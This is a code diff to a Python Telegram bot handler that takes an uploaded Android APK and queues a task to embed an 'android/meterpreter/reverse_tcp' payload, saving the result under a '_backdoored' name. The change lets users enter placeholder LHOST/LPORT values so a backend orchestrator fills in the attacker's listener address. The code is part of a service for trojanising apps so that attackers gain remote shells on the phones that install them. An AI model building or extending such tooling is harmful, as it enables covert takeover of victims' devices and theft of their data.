@@ -459,10 +459,10 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         return UPLOAD_PARAMS
     
     lhost, lport = parts[:2]
-    if not _valid_host(lhost) or not _valid_port(lport):
-        await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة. تأكد من صيغة IP/اسم المضيف ونطاق المنفذ 1-65535.")
-        return UPLOAD_PARAMS
-    
+    # Allow placeholders to trigger auto-detection on orchestrator side
+    placeholder_host = lhost.upper() in {"LHOST", "AUTO", "ANY"}
+    placeholder_port = lport.upper() in {"LPORT", "AUTO"}
+
     output_name = parts[2] if len(parts) >= 3 else sess.upload_file_info["original_name"].replace('.apk', '_backdoored')
     
     # Create task parameters
@@ -470,11 +470,14 @@ async def handle_upload_params(update: Update, context: ContextTypes.DEFAULT_TYP
         "mode": "upload_apk",
         "upload_file_path": sess.upload_file_path,
         "file_info": sess.upload_file_info,
-        "lhost": lhost,
-        "lport": lport,
         "output_name": output_name,
         "payload": "android/meterpreter/reverse_tcp"
     }
+    if not (placeholder_host or placeholder_port):
+        if not _valid_host(lhost) or not _valid_port(lport):
+            await update.message.reply_text("قيمة LHOST أو LPORT غير صحيحة. تأكد من صيغة IP/اسم المضيف ونطاق المنفذ 1-65535.")
+            return UPLOAD_PARAMS
+        sess.params.update({"lhost": lhost, "lport": lport})
     
     # Create task via API with optional Authorization
     headers = {"Authorization": f"Bearer {ORCH_AUTH_TOKEN}"} if ORCH_AUTH_TOKEN else {}
